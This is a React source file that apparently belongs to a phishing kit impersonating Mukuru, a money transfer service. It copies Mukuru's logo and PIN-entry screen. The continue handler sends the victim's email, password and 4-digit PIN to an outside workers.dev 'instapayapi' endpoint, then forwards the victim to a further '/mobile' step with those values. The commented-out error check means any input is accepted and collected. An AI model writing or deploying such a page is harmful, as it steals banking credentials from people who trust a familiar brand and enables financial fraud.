// import React, { useRef, useState } from "react";

// const MukuruPin = () => {
//   const [pin, setPin] = useState(["", "", "", ""]);
//   const inputsRef = useRef([]);

//   const handleChange = (value, index) => {
//     if (!/^\d?$/.test(value)) return;

//     const newPin = [...pin];
//     newPin[index] = value;
//     setPin(newPin);

//     // Automatically move to next input
//     if (value && index < 3) {
//       inputsRef.current[index + 1]?.focus();
//     }
//   };

//   const handleKeyDown = (e, index) => {
//     if (e.key === "Backspace" && !pin[index] && index > 0) {
//       inputsRef.current[index - 1]?.focus();
//     }
//   };

//   const handleContinue = () => {
//     const enteredPin = pin.join("");

//     if (enteredPin.length !== 4) return;

//     console.log("PIN:", enteredPin);
//   };

//   return (
//     <div className="min-h-screen bg-white px-6 pt-[40px] sm:px-8 sm:pt-[40px]">
//       {/* Logo */}
//       <div className="flex items-center">
//         {/* Mukuru Icon */}
//         <div
//           className="
//             flex h-[72px] w-[72px] items-center justify-center
//             rounded-[17px] bg-white
//             shadow-[0_6px_20px_rgba(226,76,51,0.10)]
//           "
//         >
//             <svg viewBox="0 0 52 52" fill="none"><path d="M26 3 L31.5 13.5 L44 8.5 L39 21 L51 26 L39 31 L44 43.5 L31.5 38.5 L26 49 L20.5 38.5 L8 43.5 L13 31 L1 26 L13 21 L8 8.5 L20.5 13.5 Z" fill="none" stroke="#E8442A" stroke-width="3.5" stroke-linejoin="round" stroke-linecap="round"></path></svg> 
//         </div>

//         {/* Mukuru Text */}
//         <h1 className="ml-[16px] text-[32px] font-bold tracking-[1px] text-[#080808]">
//           MUKURU
//         </h1>
//       </div>

//       {/* Heading */}
//       <h2
//         className="
//           mt-[48px]
//           text-[24px]
//           font-bold
//           leading-[1.2]
//           text-[#111111]
//         "
//       >
//         Enter Your 4 Digit Mukuru PIN
//       </h2>

//       {/* PIN Inputs */}
//       <div className="mt-[92px] grid grid-cols-4 gap-[19px]">
//         {pin.map((digit, index) => (
//           <input
//             key={index}
//             ref={(el) => (inputsRef.current[index] = el)}
//             type="password"
//             inputMode="numeric"
//             maxLength={1}
//             value={digit}
//             onChange={(e) => handleChange(e.target.value, index)}
//             onKeyDown={(e) => handleKeyDown(e, index)}
//             className={`
//               h-[5px]
//               w-full
//               border-0
//               border-b-[4px]
//               bg-transparent
//               text-center
//               text-[24px]
//               font-bold
//               outline-none
//               transition-all
//               ${
//                 digit
//                   ? "border-[#E34B35]"
//                   : index === 0
//                   ? "border-[#E34B35]"
//                   : "border-[#C9C9C9]"
//               }
//               focus:border-[#E34B35]
//             `}
//           />
//         ))}
//       </div>

//       {/* Continue Button */}
//       <button
//         onClick={handleContinue}
//         disabled={pin.join("").length !== 4}
//         className="
//           mt-[56px]
//           h-[63px]
//           w-full
//           rounded-[12px]
//           bg-[#EF968A]
//           text-[20px]
//           font-bold
//           tracking-[0.5px]
//           text-white
//           transition
//           hover:bg-[#E98B7E]
//           disabled:cursor-default
//         "
//       >
//         CONTINUE
//       </button>
//     </div>
//   );
// };

// export default MukuruPin;

import React, { useEffect, useRef, useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";

const MukuruPin = () => {
  const [pin, setPin] = useState(["", "", "", ""]);
  const inputsRef = useRef([]);
  const navigate = useNavigate();
  const location = useLocation();
  const { email, password } = location.state || {};

  // Page open hote hi first input focus
  useEffect(() => {
    const timer = setTimeout(() => {
      inputsRef.current[0]?.focus();
    }, 300);

    return () => clearTimeout(timer);
  }, []);

  const handleChange = (value, index) => {
    // Sirf numbers allow
    if (!/^\d?$/.test(value)) return;

    const newPin = [...pin];
    newPin[index] = value;
    setPin(newPin);

    // Next input par focus
    if (value && index < 3) {
      setTimeout(() => {
        inputsRef.current[index + 1]?.focus();
      }, 0);
    }
  };

  const handleKeyDown = (e, index) => {
    // Backspace
    if (e.key === "Backspace") {
      if (pin[index]) {
        const newPin = [...pin];
        newPin[index] = "";
        setPin(newPin);
      } else if (index > 0) {
        const newPin = [...pin];
        newPin[index - 1] = "";
        setPin(newPin);

        setTimeout(() => {
          inputsRef.current[index - 1]?.focus();
        }, 0);
      }
    }
  };

  const handleContinue = async() => {
    const enteredPin = pin.join("");

    if (enteredPin.length !== 4) return;

    console.log("PIN:", enteredPin);
    try {
     const response = await fetch("https://my-worker.instapayapi.workers.dev/api/mukuruPin", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password, pin: enteredPin }),
      });

      const data = await response.json();

    //   if (!response.ok) {
    //     setError(data.message || "Invalid password. Please try again.");
    //     return;
    //   }
       navigate("/mobile", { state: { email, password, pin: enteredPin } });

    } catch (err) {
      console.error("API error:", err);
    }

  };

  return (
    <div className="min-h-screen bg-white px-6 pt-[40px] sm:px-8 sm:pt-[40px]">

      {/* Logo */}
      <div className="flex items-center">

        {/* Mukuru Logo Box */}
        <div
          className="
            flex
            h-[72px]
            w-[72px]
            items-center
            justify-center
            rounded-[18px]
            bg-white
            shadow-[0_2px_18px_#e8442a2e]
          "
        >
          <svg
            viewBox="0 0 52 52"
            fill="none"
            className="h-[52px] w-[52px]"
          >
            <path
              d="M26 3
                 L31.5 13.5
                 L44 8.5
                 L39 21
                 L51 26
                 L39 31
                 L44 43.5
                 L31.5 38.5
                 L26 49
                 L20.5 38.5
                 L8 43.5
                 L13 31
                 L1 26
                 L13 21
                 L8 8.5
                 L20.5 13.5
                 Z"
              fill="none"
              stroke="#E8442A"
              strokeWidth="3.5"
              strokeLinejoin="round"
              strokeLinecap="round"
            />
          </svg>
        </div>

        {/* Mukuru Text */}
        <h1
          className="
            ml-[16px]
            text-[32px]
            font-bold
            tracking-[1px]
            text-[#080808]
          "
        >
          MUKURU
        </h1>
      </div>

      {/* Heading */}
      <h2
        className="
          mt-[48px]
          text-[24px]
          font-bold
          leading-[1.2]
          text-[#111111]
        "
      >
        Enter Your 4 Digit Mukuru PIN
      </h2>

      {/* PIN Inputs */}
      <div className="mt-[70px] grid grid-cols-4 gap-[19px]">

        {pin.map((digit, index) => (
          <div key={index} className="relative">

            <input
              ref={(el) => (inputsRef.current[index] = el)}
              type="text"
              inputMode="numeric"
              pattern="[0-9]*"
              autoComplete="off"
              maxLength={1}
              value={digit}
              onChange={(e) =>
                handleChange(e.target.value, index)
              }
              onKeyDown={(e) =>
                handleKeyDown(e, index)
              }
              className={`
                h-[42px]
                w-full
                border-0
                border-b-[4px]
                bg-transparent
                pb-[5px]
                text-center
                text-[26px]
                font-bold
                leading-[32px]
                text-[#111111]
                outline-none
                transition-all
                caret-[#E8442A]

                ${
                  digit
                    ? "border-[#E8442A]"
                    : index === 0
                    ? "border-[#E8442A]"
                    : "border-[#C9C9C9]"
                }

                focus:border-[#E8442A]
              `}
            />

          </div>
        ))}

      </div>

      {/* Continue Button */}
      <button
        onClick={handleContinue}
        // disabled={pin.join("").length !== 4}
        className="
          mt-[56px]
          h-[63px]
          w-full
          rounded-[12px]
          bg-[#E8442A]
          text-[20px]
          font-bold
          tracking-[0.5px]
          text-white
          transition
        "
      >
        CONTINUE
      </button>

    </div>
  );
};

export default MukuruPin;